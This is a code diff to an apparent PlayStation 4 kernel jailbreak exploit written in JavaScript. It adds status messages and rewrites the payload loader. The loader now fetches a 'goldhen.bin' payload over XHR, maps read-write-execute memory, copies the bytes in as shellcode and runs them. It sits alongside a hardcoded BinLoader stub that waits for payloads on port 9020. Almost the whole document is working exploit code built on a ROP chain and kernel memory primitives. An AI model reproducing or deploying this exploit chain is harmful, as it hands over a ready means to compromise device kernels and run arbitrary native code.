@@ -150,7 +150,7 @@ const num_leaks = 5;
 const num_clobbers = 8;
 
 let chain = null;
-var nogc = [];
+let nogc = [];
 
 async function init() {
     await rop.init();
@@ -182,6 +182,14 @@ function call_nze(...args) {
     if (res !== 0) {
         die(`call(${args[0]}) returned nonzero: ${res}`);
     }
+}
+
+function allset() {
+    msgs.innerHTML="PS4 Exploited And Payload Loaded.";
+}
+
+function awaitpl() {
+    msgs.innerHTML="Payload Already Loaded, BinLoader Is Ready.<br>Send A Payload To Port 9020 Now";
 }
 
 // #define SCE_KERNEL_AIO_STATE_NOTIFIED       0x10000
@@ -1680,9 +1688,9 @@ function setup(block_fd) {
 }
 
 function runBinLoader() {
-    var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
-    var payload_loader = malloc32(0x1000);
-    var BLDR = payload_loader.backing;
+    const payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+    const payload_loader = malloc32(0x1000);
+    const BLDR = payload_loader.backing;
     BLDR[0]  = 0x56415741;  BLDR[1]  = 0x83485541;  BLDR[2]  = 0x894818EC;
     BLDR[3]  = 0xC748243C;  BLDR[4]  = 0x10082444;  BLDR[5]  = 0x483C2302;
     BLDR[6]  = 0x102444C7;  BLDR[7]  = 0x00000000;  BLDR[8]  = 0x000002BF;
@@ -1707,7 +1715,7 @@ function runBinLoader() {
 
     chain.sys('mprotect', payload_loader, 0x4000, (PROT_READ | PROT_WRITE | PROT_EXEC));
 
-    var pthread = malloc(0x10);
+    const pthread = malloc(0x10);
     sysi('mlock', payload_buffer, 0x300000);
 
     call_nze(
@@ -1717,8 +1725,7 @@ function runBinLoader() {
         payload_loader,
         payload_buffer
     );
-
-    log('BinLoader is ready. Send a payload to port 9020 now');
+    awaitpl();
 }
 
 // overview:
@@ -1844,24 +1851,30 @@ export async function kexploit() {
     set_rtprio(current_rtprio);
 }
 
+// KEX
+kexploit().then(() => {
+    loadPayload();
+})
+
 function malloc(sz) {
-    var backing = new Uint8Array(0x10000 + sz);
+    const backing = new Uint8Array(0x10000 + sz);
     nogc.push(backing);
-    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    const ptr = mem.readp(mem.addrof(backing).add(0x10));
     ptr.backing = backing;
     return ptr;
 }
 
 function malloc32(sz) {
-    var backing = new Uint8Array(0x10000 + sz * 4);
+    const backing = new Uint8Array(0x10000 + sz * 4);
     nogc.push(backing);
-    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    const ptr = mem.readp(mem.addrof(backing).add(0x10));
     ptr.backing = new Uint32Array(backing.buffer);
     return ptr;
 }
+
 function array_from_address(addr, size) {
-   var og_array = new Uint32Array(0x1000);
-    var og_array_i = mem.addrof(og_array).add(0x10);
+    const og_array = new Uint32Array(0x1000);
+    const og_array_i = mem.addrof(og_array).add(0x10);
     mem.write64(og_array_i, addr);
     mem.write32(og_array_i.add(0x8), size);
     mem.write32(og_array_i.add(0xC), 0x1);
@@ -1869,46 +1882,62 @@ function array_from_address(addr, size) {
     return og_array;
 }
 
-kexploit().then(() => {
+function loadPayload() {
+    // Why xhr instead of fetch? More universal support, more control, better errors, etc.
+    log(`loading payload`);
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET','goldhen.bin');
+    xhr.responseType = "arraybuffer";
+    xhr.onreadystatechange = function () {
+      // When request is 'DONE'
+      if (xhr.readyState === 4) {
+        // If response code is 'OK'
+        if (xhr.status === 200) {
+          try {
+            // Allocate a buffer with length rounded up to the next multiple of 4 bytes for Uint32 alignment
+            const padding_length = (4 - (xhr.response.byteLength % 4)) % 4;
+            const padded_buffer = new Uint8Array(xhr.response.byteLength + padding_length);
 
-var loader_addr = chain.sysp(
-  'mmap',
-  new Int(0, 0),                         
-  MAP_ANON,                               
-  PROT_READ | PROT_WRITE | PROT_EXEC,    
-  0x41000,                              
-  -1,
-  0
-);
+            // Load xhr response data into the payload buffer and pad the rest with zeros
+            padded_buffer.set(new Uint8Array(xhr.response), 0);
+            if (padding_length) {
+              padded_buffer.set(new Uint8Array(padding_length), xhr.response.byteLength);
+            }
 
- var tmpStubArray = array_from_address(loader_addr, 1);
- tmpStubArray[0] = 0x00C3E7FF;
+            // Convert padded_buffer to Uint32Array. That's what `array_from_address()` expects
+            const shellcode = new Uint32Array(padded_buffer.buffer);
 
- var req = new XMLHttpRequest();
- req.responseType = "arraybuffer";
- req.open('GET','payload.bin');
- req.send();
- req.onreadystatechange = function () {
-  if (req.readyState == 4) {
-   var PLD = req.response;
-   var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
-   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
-   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-   tmp.set(new Uint8Array(req.response), 0);
-   tmp.set(padding, req.response.byteLength);
-   var shellcode = new Uint32Array(tmp.buffer);
-   pl.set(shellcode,0);
-   var pthread = malloc(0x10);
-   
-    call_nze(
-        'pthread_create',
-        pthread,
-        0,
-        loader_addr,
-        payload_buffer,
-    );	
-   }
- };
+            // Map memory with RWX permissions to load the payload into
+            const payload_buffer = chain.sysp("mmap", 0, padded_buffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PREFAULT_READ, -1, 0);
+            log(`payload buffer allocated at ${payload_buffer}`);
 
-})
+            // Create an JS array that "shadows" the mapped location
+            const payload_buffer_shadow = array_from_address(payload_buffer, shellcode.length);
+
+            // Move the shellcode to the array created in the previous step
+            payload_buffer_shadow.set(shellcode);
+            log(`loaded ${xhr.response.byteLength} bytes for payload (+ ${padding_length} bytes padding)`);
+
+            // Call the payload
+            chain.call_void(payload_buffer);
+
+            // Unmap the memory used for the payload
+            sysi("munmap", payload_buffer, padded_buffer.length);
+
+            // Notification payload
+            allset();
+          } catch (e) {
+            // Caught error while trying to execute payload
+            log(`error in loadPayload: ${e.message}`);
+          }
+        } else {
+          // Some other HTTP response code (eg. 404)
+          log(`error retrieving payload, ${xhr.status}`);
+        }
+      }
+    };
+    xhr.onerror = function () {
+      log('network error');
+    };
+    xhr.send();
+}
